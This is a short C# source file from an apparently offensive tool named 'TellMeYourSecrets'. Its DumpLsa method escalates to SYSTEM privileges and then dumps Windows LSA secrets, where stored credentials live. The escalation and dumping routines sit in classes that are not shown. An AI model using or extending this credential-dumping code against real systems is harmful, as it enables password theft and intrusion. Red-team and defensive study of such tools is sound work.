using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace TellMeYourSecrets
{
    public class LSA
    {
        public static String DumpLsa()
        {
            StringBuilder output = new StringBuilder();
            CheckPrivileges checkSystem = new CheckPrivileges();
            String results = "";
            if (checkSystem.GetSystem())
            {
                LSASecrets lsaSecrets = new LSASecrets();
                lsaSecrets.DumpLSASecrets();
                results = lsaSecrets.GetOutput();
            }
            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
            return output.ToString();
        }
    }
}
